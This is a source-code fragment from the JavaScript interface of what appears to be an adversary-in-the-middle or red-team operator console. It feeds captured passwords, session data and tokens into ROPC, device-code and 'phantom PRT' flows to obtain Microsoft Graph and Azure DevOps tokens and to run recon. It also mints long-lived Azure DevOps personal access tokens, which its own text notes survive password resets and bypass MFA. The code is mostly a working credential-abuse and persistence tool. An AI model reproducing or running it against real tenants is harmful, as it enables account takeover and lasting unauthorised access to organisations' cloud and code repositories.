  // -Password / -TenantId (and optional -ServicePrincipal) from the args.
  if(fn==='Get-AAATokenFromAzLogin'){return aaaRunTokenGetter(siteId,argsStr,out)}
  out.innerHTML='<div style="color:#94a3b8">Running '+esc(fn)+'…</div>';
  let parsed;
  try{parsed=aaaParseArgs(argsStr)}catch(e){out.innerHTML='<div style="color:#f87171">Bad args: '+esc(String(e))+'</div>';return}
  try{
    const r=await apiFetch('/api/aaa/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,function:fn,args:parsed,token_index:tokIdx})});
    const d=await r.json();
    if(d.error&&d.exit_code===undefined){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
    const okColor=d.ok?'#4ade80':'#f87171';
    let html='<div style="margin-bottom:4px"><span style="color:'+okColor+';font-weight:bold">exit '+d.exit_code+'</span> <span style="color:#78859b;font-size:12px;margin-left:8px">'+d.elapsed_ms+'ms · token: '+esc(d.source||'?')+'</span></div>';
    if(d.parsed_json!==null&&d.parsed_json!==undefined){
      html+='<pre style="background:#020617;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;font-family:monospace">'+esc(JSON.stringify(d.parsed_json,null,2))+'</pre>';
    }else if(d.stdout){
      html+='<pre style="background:#020617;padding:8px;border-radius:4px;overflow:auto;max-height:400px;color:#cbd5e1;font-size:12px;font-family:monospace">'+esc(d.stdout)+'</pre>';
    }else{
      html+='<div style="color:#78859b;font-size:13px">(no stdout)</div>';
    }
    if(d.stderr&&d.stderr.trim()){
      html+='<div style="margin-top:6px;color:#fca5a5;font-size:12px;font-weight:600">stderr:</div><pre style="background:#1e0a0a;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#fecaca;font-size:12px;font-family:monospace">'+esc(d.stderr)+'</pre>';
    }
    out.innerHTML=html;
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
// Run the token-getter selected in the function dropdown: parse -User /
// -Password / -TenantId (and optional -ServicePrincipal) from the args line
// and POST /api/aaa/login, which acquires + stashes a Graph token.
async function aaaRunTokenGetter(siteId,argsStr,out){
  let parsed;
  try{parsed=aaaParseArgs(argsStr)}catch(e){out.innerHTML='<div style="color:#f87171">Bad args: '+esc(String(e))+'</div>';return}
  const byName={};parsed.forEach(a=>{if(a.name)byName[a.name.toLowerCase()]=(a.value!==undefined?a.value:true)});
  const sel=document.getElementById('aaa-fn-'+siteId);
  const user=byName['user']||'',tid=byName['tenantid']||'';
  // Use -Password from the args if the operator typed one; otherwise fall back
  // to the captured-session password stashed on the select (kept out of the
  // visible args box).
  let password=byName['password'];
  if((password===undefined||password==='')&&sel&&sel.dataset.pass)password=sel.dataset.pass;
  password=password||'';
  const sp=byName['serviceprincipal']===true;
  if(!user||!password||!tid){out.innerHTML='<div style="color:#f87171">Get-AAATokenFromAzLogin needs -User, -TenantId, and a password — none captured on this credential, so add <code>-Password &#39;…&#39;</code>.</div>';return}
  out.innerHTML='<div style="color:#94a3b8">Connecting (Az.Accounts → Get-AzAccessToken)…</div>';
  try{
    const r=await apiFetch('/api/aaa/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,user:user,password:password,tenant_id:tid,service_principal:sp})});
    const d=await r.json();
    if(!d.ok){out.innerHTML='<div style="color:#f87171">'+esc(d.error||'failed')+'</div>'+(d.stderr?'<details style="margin-top:6px"><summary style="cursor:pointer;color:#94a3b8;font-size:12px">stderr</summary><pre style="background:#1e0a0a;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#fecaca;font-size:11px;font-family:monospace">'+esc(d.stderr)+'</pre></details>':'');return}
    const tok=d.access_token||'';
    out.innerHTML=`<div style="color:#4ade80;margin-bottom:4px">✓ token captured (${tok.length} bytes, ${d.elapsed_ms}ms)${d.persisted?' · persisted to credentials':''}</div><div style="color:#78859b;font-size:12px">Now pick a recon function above and Run — it uses this token.</div>`;
    send({cmd:'get_sites'}); // refresh so the new token shows in the Token dropdown
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
function aaaLoginToggle(siteId){
  const p=document.getElementById('aaa-login-'+siteId);
  if(!p)return;
  p.style.display=p.style.display==='none'?'':'none';
  if(p.style.display!=='none'){
    document.getElementById('aaa-login-pass-'+siteId)?.focus();
  }
}
async function aaaLoginRun(siteId){
  const user=(document.getElementById('aaa-login-user-'+siteId)?.value||'').trim();
  const pass=document.getElementById('aaa-login-pass-'+siteId)?.value||'';
  const tid=(document.getElementById('aaa-login-tid-'+siteId)?.value||'').trim();
  const sp=!!document.getElementById('aaa-login-sp-'+siteId)?.checked;
  const out=document.getElementById('aaa-login-result-'+siteId);
  if(!user||!pass||!tid){out.innerHTML='<div style="color:#f87171">user, password, and tenant are all required</div>';return}
  out.innerHTML='<div style="color:#94a3b8">Connecting (Az.Accounts → Get-AzAccessToken)…</div>';
  try{
    const r=await apiFetch('/api/aaa/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,user:user,password:pass,tenant_id:tid,service_principal:sp})});
    const d=await r.json();
    if(!d.ok){
      out.innerHTML='<div style="color:#f87171">'+esc(d.error||'failed')+'</div>'+(d.stderr?'<details style="margin-top:6px"><summary style="cursor:pointer;color:#94a3b8;font-size:12px">stderr</summary><pre style="background:#1e0a0a;padding:8px;border-radius:4px;overflow:auto;max-height:200px;color:#fecaca;font-size:11px;font-family:monospace">'+esc(d.stderr)+'</pre></details>':'');
      return;
    }
    const tok=d.access_token||'';
    out.innerHTML=`<div style="color:#4ade80;margin-bottom:4px">✓ token captured (${tok.length} bytes, ${d.elapsed_ms}ms)${d.persisted?' · persisted to credentials':''}</div>
      <div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">
        <code style="color:#cbd5e1;font-size:11px;flex:1;background:#020617;padding:4px 8px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(tok.slice(0,80))}…</code>
        <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f" data-tok="${esc(tok)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button>
      </div>`;
    // Refresh sitesCache so the new token shows up in the AAA runner's
    // Token dropdown without a manual reload.
    send({cmd:'get_sites'});
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
function aaaLoginMethodChange(siteId){
  const m=document.getElementById('aaa-login-method-'+siteId).value;
  const show=(id,on)=>{const e=document.getElementById(id);if(e)e.style.display=on?'':'none'};
  show('aaa-login-pw-'+siteId, m==='password');
  show('aaa-login-dc-'+siteId, m==='devicecode');
  show('aaa-login-sp-wrap-'+siteId, m==='password');
  const btn=document.getElementById('aaa-login-go-'+siteId);
  if(btn) btn.textContent=(m==='devicecode')?'▶ Start device code':'▶ Run';
}
function aaaLoginGo(siteId){
  const m=document.getElementById('aaa-login-method-'+siteId)?.value||'password';
  return (m==='devicecode') ? aaaLoginDeviceCode(siteId) : aaaLoginRun(siteId);
}
async function aaaLoginDeviceCode(siteId){
  const out=document.getElementById('aaa-login-result-'+siteId);
  const tid=(document.getElementById('aaa-login-tid-'+siteId)?.value||'').trim()||'organizations';
  out.innerHTML='<div style="color:#94a3b8">requesting device code…</div>';
  let start;
  try{
    const r=await apiFetch('/api/ado-devicecode/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,scope:'https://graph.microsoft.com/.default offline_access'})});
    start=await r.json();
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>';return}
  if(!start.ok){out.innerHTML='<div style="color:#f87171">✗ '+esc(start.error||'device code init failed')+'</div>';return}
  const dc=start.device_code, cid=start.client_id;
  const vuri=start.verification_uri||'https://microsoft.com/devicelogin';
  out.innerHTML=`<div style="background:#0c1912;border:1px solid #1f3a29;border-radius:4px;padding:10px;margin-bottom:6px">
    <div style="color:#e6edf3;font-size:13px;margin-bottom:6px">Complete sign-in (with MFA) to mint a Graph token:</div>
    <div style="font-size:13px;margin-bottom:4px">1. Open <a href="${esc(vuri)}" target="_blank" style="color:#56c2ff">${esc(vuri)}</a></div>
    <div style="font-size:13px">2. Enter code <code style="background:#020617;color:#4ade80;font-size:15px;padding:2px 8px;border-radius:4px;font-weight:700;letter-spacing:1px">${esc(start.user_code||'?')}</code>
      <button class="btn" style="padding:1px 8px;font-size:11px;background:#1e3a5f" data-tok="${esc(start.user_code||'')}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button></div>
    <div id="aaa-login-dcs-${siteId}" style="color:#94a3b8;font-size:12px;margin-top:8px">⏳ waiting for you to complete sign-in…</div>
  </div>`;
  const st=document.getElementById('aaa-login-dcs-'+siteId);
  const deadline=Date.now()+Math.min(start.expires_in||900,900)*1000;
  let poll=Math.max(start.interval||5,5)*1000;
  const tick=async()=>{
    if(Date.now()>deadline){st.innerHTML='<span style="color:#f87171">✗ device code expired — Start device code again</span>';return}
    try{
      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc,site_id:siteId,tool:'aaa'})});
      const d=await r.json();
      if(d.ok&&d.access_token){
        st.innerHTML='<span style="color:#4ade80">✓ signed in — stashing token…</span>';
        const sr=await apiFetch('/api/aaa/store-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,access_token:d.access_token,tenant_id:tid,source:'device-code'})});
        const sd=await sr.json();
        st.innerHTML= sd.ok
          ? '<span style="color:#4ade80">✓ Graph token stashed to credentials — pick it in the AAA runner Token dropdown.</span>'
          : '<span style="color:#f87171">token obtained but persist failed: '+esc(sd.error||'?')+'</span>';
        if(sd.ok) send({cmd:'get_sites'});
        return;
      }
      if(d.pending){if(d.slow_down)poll+=5000;setTimeout(tick,poll);return}
      st.innerHTML='<span style="color:#f87171">✗ '+esc(d.aadsts_code||d.error||'failed')+'</span>';
    }catch(e){setTimeout(tick,poll);}
  };
  setTimeout(tick,poll);
}
function tokenToggle(siteId){
  const p=document.getElementById('tok-'+siteId);
  if(!p)return;
  p.style.display=p.style.display==='none'?'':'none';
  if(p.style.display!=='none'){
    document.getElementById('tok-pass-'+siteId)?.focus();
  }
}
function _tokenLegHtml(label,r,siteId){
  if(!r){return `<div style="flex:1;min-width:240px;background:#0f0a0a;padding:8px;border-radius:4px;border:1px solid #3f1d1d"><div style="color:#cbd5e1;font-size:12px">${label}</div><div style="color:#f87171;margin-top:4px">no result</div></div>`}
  const url=r.url||'';
  const head=`<div style="color:#cbd5e1;font-size:12px;margin-bottom:2px">${label}</div><code style="color:#78859b;font-size:10px;word-break:break-all">${esc(url)}</code>`;
  if(r.error&&!r.aadsts_code&&!r.ok){
    return `<div style="flex:1;min-width:240px;background:#0f0a0a;padding:8px;border-radius:4px;border:1px solid #3f1d1d">${head}<div style="color:#f87171;margin-top:4px">${esc(r.error)}</div></div>`;
  }
  if(!r.ok){
    return `<div style="flex:1;min-width:240px;background:#0f0d06;padding:8px;border-radius:4px;border:1px solid #78530f">${head}
      <div style="color:#fbbf24;margin-top:4px">✗ ${esc(r.aadsts_code||r.error||'blocked')} — CA blocked (expected/good)</div>
      <div style="color:#94a3b8;font-size:11px;margin-top:2px">${esc((r.error_description||'').slice(0,220))}</div></div>`;
  }
  const tok=r.access_token||'';
  return `<div style="flex:1;min-width:240px;background:#0a0f0a;padding:8px;border-radius:4px;border:1px solid #7f1d1d">${head}
    <div style="color:#f87171;font-weight:600;margin-top:4px">⚠ succeeded — NOT blocked by CA</div>
    <div style="color:#4ade80;font-size:12px">✓ token (${tok.length} b, exp ${r.expires_in||'?'}s)</div>
    <div style="display:flex;gap:6px;align-items:center;margin-top:4px">
      <code style="color:#cbd5e1;font-size:10px;flex:1;background:#020617;padding:3px 6px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(tok.slice(0,60))}…</code>
      <button class="btn" style="padding:1px 8px;font-size:11px;background:#1e3a5f" data-tok="${esc(tok)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button>
      <button class="btn" style="padding:1px 8px;font-size:11px;background:#065f46" data-tok="${esc(tok)}" onclick="testGraphDirect(this.dataset.tok,this,'${siteId||''}')">Graph</button>
    </div></div>`;
}
async function tokenRun(siteId){
  const user=(document.getElementById('tok-user-'+siteId)?.value||'').trim();
  const pass=document.getElementById('tok-pass-'+siteId)?.value||'';
  const tid=(document.getElementById('tok-tid-'+siteId)?.value||'').trim()||'organizations';
  const cid=(document.getElementById('tok-cid-'+siteId)?.value||'').trim();
  const out=document.getElementById('tok-result-'+siteId);
  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
  out.innerHTML='<div style="color:#94a3b8">Requesting tokens from v1 + v2 (grant_type=password)…</div>';
  try{
    const r=await apiFetch('/api/test-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,username:user,password:pass,tenant_id:tid,client_id:cid})});
    const d=await r.json();
    if(d.error&&!d.v1&&!d.v2){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
    out.innerHTML=`<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:stretch">
      ${_tokenLegHtml('v1 · /oauth2/token',d.v1,siteId)}
      ${_tokenLegHtml('v2 · /oauth2/v2.0/token',d.v2,siteId)}
    </div>`;
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
function ropcToggle(siteId){
  const p=document.getElementById('ropc-'+siteId);
  if(!p)return;
  p.style.display=p.style.display==='none'?'':'none';
  if(p.style.display!=='none'){
    document.getElementById('ropc-pass-'+siteId)?.focus();
  }
}
async function ropcRun(siteId){
  const user=(document.getElementById('ropc-user-'+siteId)?.value||'').trim();
  const pass=document.getElementById('ropc-pass-'+siteId)?.value||'';
  const tid=(document.getElementById('ropc-tid-'+siteId)?.value||'').trim()||'organizations';
  const cid=(document.getElementById('ropc-cid-'+siteId)?.value||'').trim();
  const out=document.getElementById('ropc-result-'+siteId);
  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
  out.innerHTML='<div style="color:#94a3b8">Requesting token (grant_type=password)…</div>';
  try{
    const r=await apiFetch('/api/test-ropc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,username:user,password:pass,tenant_id:tid,client_id:cid})});
    const d=await r.json();
    if(d.error&&!d.aadsts_code){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
    if(!d.ok){
      // A blocked grant is itself the finding — surface the AADSTS code
      // prominently rather than treating it as a plain failure.
      out.innerHTML=`<div style="color:#fbbf24;margin-bottom:4px">✗ ${esc(d.aadsts_code||d.error||'blocked')} — CA policy blocked the ROPC grant (this may be the *expected*/good outcome)</div>
        <div style="color:#94a3b8;font-size:12px">${esc(d.error_description||'')}</div>`;
      return;
    }
    const tok=d.access_token||'';
    out.innerHTML=`<div style="color:#f87171;font-weight:600;margin-bottom:4px">⚠ ROPC succeeded — legacy grant was NOT blocked by CA policy</div>
      <div style="color:#4ade80;margin-bottom:4px">✓ token obtained (${tok.length} bytes, expires in ${d.expires_in||'?'}s)</div>
      <div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">
        <code style="color:#cbd5e1;font-size:11px;flex:1;background:#020617;padding:4px 8px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(tok.slice(0,80))}…</code>
        <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f" data-tok="${esc(tok)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button>
        <button class="btn" style="padding:2px 10px;font-size:12px;background:#065f46" data-tok="${esc(tok)}" onclick="testGraphDirect(this.dataset.tok,this,'${siteId}')">Test Graph</button>
      </div>`;
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
function adoPatToggle(siteId){
  const p=document.getElementById('adopat-'+siteId);
  if(!p)return;
  p.style.display=p.style.display==='none'?'':'none';
  if(p.style.display!=='none'){
    document.getElementById('adopat-pass-'+siteId)?.focus();
  }
}
function adoPatMethodChange(siteId){
  const m=document.getElementById('adopat-method-'+siteId).value;
  const show=(id,on)=>{const e=document.getElementById(id);if(e)e.style.display=on?'':'none'};
  show('adopat-ropc-'+siteId, m==='ropc');
  show('adopat-captured-'+siteId, m==='captured');
  show('adopat-dc-'+siteId, m==='devicecode');
  show('adopat-prt-'+siteId, m==='phantomprt');
  const btn=document.getElementById('adopat-go-'+siteId);
  if(btn) btn.textContent = (m==='devicecode') ? '▶ Start device code' : '▶ Create';
}
// Shared: gather the PAT options + creds, POST /api/create-ado-pat, render.
async function _adoPatCreate(siteId, creds, statusMsg){
  const out=document.getElementById('adopat-result-'+siteId);
  const tid=(document.getElementById('adopat-tid-'+siteId)?.value||'').trim()||'organizations';
  const org=(document.getElementById('adopat-org-'+siteId)?.value||'').trim();
  const name=(document.getElementById('adopat-name-'+siteId)?.value||'').trim()||'bitm-proxy';
  const scope=(document.getElementById('adopat-scope-'+siteId)?.value||'').trim()||'app_token';
  const days=parseInt(document.getElementById('adopat-days-'+siteId)?.value||'90',10)||90;
  const allOrgs=!!document.getElementById('adopat-allorgs-'+siteId)?.checked;
  out.innerHTML='<div style="color:#94a3b8">'+esc(statusMsg||'creating PAT…')+'</div>';
  try{
    const body=Object.assign({site_id:siteId,tenant_id:tid,organization:org,display_name:name,
      scope:scope,valid_days:days,all_orgs:allOrgs}, creds||{});
    const r=await apiFetch('/api/create-ado-pat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    if(d.error&&!d.aadsts_code){
      out.innerHTML=`<div style="color:#f87171">✗ ${esc(d.stage||'error')}: ${esc(d.error)}</div>`+
        (d.organizations&&d.organizations.length?`<div style="color:#94a3b8;font-size:12px">orgs seen: ${esc(d.organizations.join(', '))}</div>`:'');
      return;
    }
    if(!d.ok){
      out.innerHTML=`<div style="color:#fbbf24;margin-bottom:4px">✗ ${esc(d.aadsts_code||d.error||'blocked')} — CA policy blocked the token grant to Azure DevOps (this may be the *expected*/good outcome)</div>
        <div style="color:#94a3b8;font-size:12px">${esc(d.error_description||'')}</div>`;
      return;
    }
    const pat=d.pat||'';
    const orgList=(d.organizations&&d.organizations.length>1)
      ? `<div style="color:#94a3b8;font-size:12px">other orgs on this account: ${esc(d.organizations.filter(o=>o!==d.organization).join(', '))}</div>`:'';
    out.innerHTML=`<div style="color:#f87171;font-weight:600;margin-bottom:4px">⚠ ADO PAT minted — durable credential, survives password reset & usually outside CA/MFA</div>
      <div style="color:#4ade80;margin-bottom:4px">✓ "${esc(d.display_name||name)}" in org <b>${esc(d.organization||'?')}</b> · scope ${esc(d.scope||scope)} · valid to ${esc(d.valid_to||'?')} · via ${esc(d.token_source||'?')}</div>
      <div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">
        <code style="color:#cbd5e1;font-size:11px;flex:1;background:#020617;padding:4px 8px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(pat.slice(0,12))}… (${pat.length} chars)</code>
        <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f" data-tok="${esc(pat)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy PAT</button>
      </div>
      <div style="color:#78859b;font-size:11px">authorizationId ${esc(d.authorization_id||'?')} — revoke from ADO → User settings → Personal access tokens</div>
      ${orgList}`;
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
// Dispatch on the selected method.
function adoPatGo(siteId){
  const out=document.getElementById('adopat-result-'+siteId);
  const m=document.getElementById('adopat-method-'+siteId)?.value||'ropc';
  if(m==='devicecode') return adoPatDeviceCode(siteId);
  if(m==='phantomprt'){
    const pp=(document.getElementById('adopat-prtpath-'+siteId)?.value||'').trim();
    return _adoPatCreate(siteId,{use_phantom_prt:true,prt_path:pp},'phantom PRT → roadtx prtauth → ADO token → create PAT…');
  }
  if(m==='captured'){
    const tok=(document.getElementById('adopat-token-'+siteId)?.value||'').trim();
    if(!tok){out.innerHTML='<div style="color:#f87171">paste an ADO-audience access token</div>';return}
    return _adoPatCreate(siteId,{access_token:tok},'captured token → discover org → create PAT…');
  }
  const user=(document.getElementById('adopat-user-'+siteId)?.value||'').trim();
  const pass=document.getElementById('adopat-pass-'+siteId)?.value||'';
  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
  return _adoPatCreate(siteId,{username:user,password:pass},'ROPC → ADO token → discover org → create PAT…');
}
// List ADO orgs — same method dispatch as adoPatGo, but discovery-only.
function adoOrgsGo(siteId){
  const out=document.getElementById('adopat-result-'+siteId);
  const m=document.getElementById('adopat-method-'+siteId)?.value||'ropc';
  if(m==='devicecode') return adoPatDeviceCode(siteId,tok=>_adoOrgsList(siteId,{access_token:tok},'device-code token → list ADO orgs…'));
  if(m==='phantomprt'){
    const pp=(document.getElementById('adopat-prtpath-'+siteId)?.value||'').trim();
    return _adoOrgsList(siteId,{use_phantom_prt:true,prt_path:pp},'phantom PRT → ADO token → list orgs…');
  }
  if(m==='captured'){
    const tok=(document.getElementById('adopat-token-'+siteId)?.value||'').trim();
    if(!tok){out.innerHTML='<div style="color:#f87171">paste an ADO-audience access token</div>';return}
    return _adoOrgsList(siteId,{access_token:tok},'captured token → list ADO orgs…');
  }
  const user=(document.getElementById('adopat-user-'+siteId)?.value||'').trim();
  const pass=document.getElementById('adopat-pass-'+siteId)?.value||'';
  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
  return _adoOrgsList(siteId,{username:user,password:pass},'ROPC → ADO token → list orgs…');
}
async function _adoOrgsList(siteId, creds, statusMsg){
  const out=document.getElementById('adopat-result-'+siteId);
  const tid=(document.getElementById('adopat-tid-'+siteId)?.value||'').trim()||'organizations';
  out.innerHTML='<div style="color:#94a3b8">'+esc(statusMsg||'listing ADO orgs…')+'</div>';
  try{
    const body=Object.assign({site_id:siteId,tenant_id:tid}, creds||{});
    const r=await apiFetch('/api/ado-orgs',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    if(!d.ok){
      if(d.aadsts_code){
        out.innerHTML=`<div style="color:#fbbf24;margin-bottom:4px">✗ ${esc(d.aadsts_code)} — CA/MFA blocked the ADO token grant (may be the expected outcome)</div><div style="color:#94a3b8;font-size:12px">${esc(d.error_description||d.error||'')}</div>`;
      }else{
        out.innerHTML=`<div style="color:#f87171">✗ ${esc(d.stage||'error')}: ${esc(d.error||'failed')}</div>`;
      }
      return;
    }
    const orgs=d.organizations||[];
    if(!orgs.length){
      out.innerHTML=`<div style="color:#fbbf24">No Azure DevOps organizations found for this account.</div><div style="color:#78859b;font-size:12px">via ${esc(d.token_source||'?')}</div>`;
      return;
    }
    const rows=orgs.map(o=>`<div style="display:flex;gap:8px;align-items:center;padding:3px 0;border-bottom:1px solid #1e293b">
      <code style="color:#7dd3fc;font-size:13px;min-width:160px">${esc(o)}</code>
      <span style="color:#64748b;font-size:12px;flex:1">dev.azure.com/${esc(o)}</span>
      <button class="btn" style="padding:1px 10px;font-size:11px;background:#1e3a5f" data-o="${esc(o)}" onclick="const el=document.getElementById('adopat-org-${siteId}');if(el)el.value=this.dataset.o">Use</button>
    </div>`).join('');
    out.innerHTML=`<div style="color:#4ade80;margin-bottom:4px">✓ ${orgs.length} Azure DevOps org${orgs.length===1?'':'s'} — via ${esc(d.token_source||'?')}</div>${rows}<div style="color:#78859b;font-size:11px;margin-top:4px">Click <b>Use</b> to drop an org into the ADO org field above, then Create a PAT scoped to it.</div>`;
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
}
// Device-code flow: start, show the code, poll until signed in, then mint.
async function adoPatDeviceCode(siteId, onToken){
  // onToken(access_token) overrides the default action (mint a PAT) — used by
  // "List ADO orgs" to reuse the same interactive device-code sign-in.
  const out=document.getElementById('adopat-result-'+siteId);
  const tid=(document.getElementById('adopat-tid-'+siteId)?.value||'').trim()||'organizations';
  out.innerHTML='<div style="color:#94a3b8">requesting device code…</div>';
  let start;
  try{
    const r=await apiFetch('/api/ado-devicecode/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid})});
    start=await r.json();
  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>';return}
  if(!start.ok){out.innerHTML='<div style="color:#f87171">✗ '+esc(start.error||'device code init failed')+'</div>';return}
  const dc=start.device_code, cid=start.client_id;
  const vuri=start.verification_uri||'https://microsoft.com/devicelogin';
  out.innerHTML=`<div style="background:#0c1912;border:1px solid #1f3a29;border-radius:4px;padding:10px;margin-bottom:6px">
    <div style="color:#e6edf3;font-size:13px;margin-bottom:6px">Complete sign-in (with MFA) to mint the ADO token:</div>
    <div style="font-size:13px;margin-bottom:4px">1. Open <a href="${esc(vuri)}" target="_blank" style="color:#56c2ff">${esc(vuri)}</a></div>
    <div style="font-size:13px">2. Enter code <code style="background:#020617;color:#4ade80;font-size:15px;padding:2px 8px;border-radius:4px;font-weight:700;letter-spacing:1px">${esc(start.user_code||'?')}</code>
      <button class="btn" style="padding:1px 8px;font-size:11px;background:#1e3a5f" data-tok="${esc(start.user_code||'')}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button></div>
    <div id="adopat-dcs-${siteId}" style="color:#94a3b8;font-size:12px;margin-top:8px">⏳ waiting for you to complete sign-in…</div>
  </div>`;
  const st=document.getElementById('adopat-dcs-'+siteId);
  const deadline=Date.now()+Math.min(start.expires_in||900,900)*1000;
  let poll=Math.max(start.interval||5,5)*1000;
  const tick=async()=>{
    if(Date.now()>deadline){st.innerHTML='<span style="color:#f87171">✗ device code expired — Start device code again</span>';return}
    try{
      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc,site_id:siteId,tool:'adopat'})});
      const d=await r.json();
      if(d.ok&&d.access_token){
        if(onToken){st.innerHTML='<span style="color:#4ade80">✓ signed in</span>';return onToken(d.access_token);}
        st.innerHTML='<span style="color:#4ade80">✓ signed in — minting PAT…</span>';return _adoPatCreate(siteId,{access_token:d.access_token},'device-code token → discover org → create PAT…');
      }
      if(d.pending){if(d.slow_down)poll+=5000;setTimeout(tick,poll);return}
      st.innerHTML='<span style="color:#f87171">✗ '+esc(d.aadsts_code||d.error||'failed')+'</span>';
    }catch(e){setTimeout(tick,poll);}
  };
  setTimeout(tick,poll);
}

// ── WebSocket: Control (config, sessions, credentials) ──
async function testGraphDirect(token,btn,siteId){
  // Inline graph test — show result next to the button. When a siteId is in
  // scope (token panels), pass it so the request/response lands on that
  // credential's 🧪 Graph flow trace, selectable in Flow Trace / send-to-LLM.
  const origText=btn.textContent;
  btn.textContent='...';btn.disabled=true;
  try{
    const r=await apiFetch('/api/test-graph',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,site_id:siteId||''})});
    const d=await r.json();
    if(d.error){btn.textContent='Error';btn.style.background='#991b1b';setTimeout(()=>{btn.textContent=origText;btn.style.background='#065f46';btn.disabled=false},3000);
      // Show detail in a nearby element or alert
      const detail=d.error;alert('Graph test error: '+detail);return}
    const ok=d.success;
    if(ok){
      const who=d.response?.displayName||d.response?.userPrincipalName||'OK';
      btn.textContent=who;btn.style.background='#065f46';
      btn.title=JSON.stringify(d.response,null,2);
      // Show full result
      const el=document.getElementById('graph-quick-result');
      if(el)el.innerHTML=`<span style="color:#4ade80">&#10003; ${esc(d.response.displayName||'')} (${esc(d.response.userPrincipalName||'')})</span>`;
    }else{
      btn.textContent=d.status_code;btn.style.background='#991b1b';
      const el=document.getElementById('graph-quick-result');
      if(el)el.innerHTML=`<span style="color:#f87171">&#10007; ${d.status_code} ${esc(typeof d.response==='string'?d.response.slice(0,100):(d.response?.error?.message||JSON.stringify(d.response).slice(0,100)))}</span>`;
    }
    setTimeout(()=>{btn.textContent=origText;btn.style.background='#065f46';btn.disabled=false},5000);
  }catch(e){btn.textContent='Err';btn.style.background='#991b1b';setTimeout(()=>{btn.textContent=origText;btn.style.background='#065f46';btn.disabled=false},3000)}
}

let wsCtrl=null;
function connectControl(){
  const proto=location.protocol==='https:'?'wss:':'ws:';
  const _ak=new URLSearchParams(location.search).get('api_key')||'';
  wsCtrl=new WebSocket(`${proto}//${location.host}/ws/control${_ak?'?api_key='+_ak:''}`);
  ws=wsCtrl; // global ref for send()
  wsCtrl.onopen=()=>updateBadge();
  wsCtrl.onclose=()=>{updateBadge();setTimeout(connectControl,2000)};
  wsCtrl.onerror=()=>wsCtrl.close();
  wsCtrl.onmessage=e=>{
    const msg=JSON.parse(e.data);
    if(msg.type==='hello'){
      // Server confirms the WS handshake completed and the
      // session is live. The badge already shows ctrl-only via
      // onopen, but emitting here too means a hung init payload
      // doesn't make the rest of the app think it's offline.
      updateBadge();
    }
    else if(msg.type==='init'){
      configCache=msg.config||{};renderConfig();renderPresets();renderUpstreamHost();renderNoisyExts();
      _paintHideSidBtn();
      savedSessions=msg.saved_sessions||[];sitesCache=msg.sites||[];
      flowSessionMeta={};for(const f of (msg.flow_sessions||[]))flowSessionMeta[f.sid]=f;
      renderSessions(msg.sessions||{});renderTabs();
      if(currentTab==='flow')refreshFlowSessionList();
      if(msg.proxy_status){proxyStatus=msg.proxy_status;renderProxy()}
      if(msg.auth_proxy_status){authProxyStatus=msg.auth_proxy_status;renderAuthProxy()}
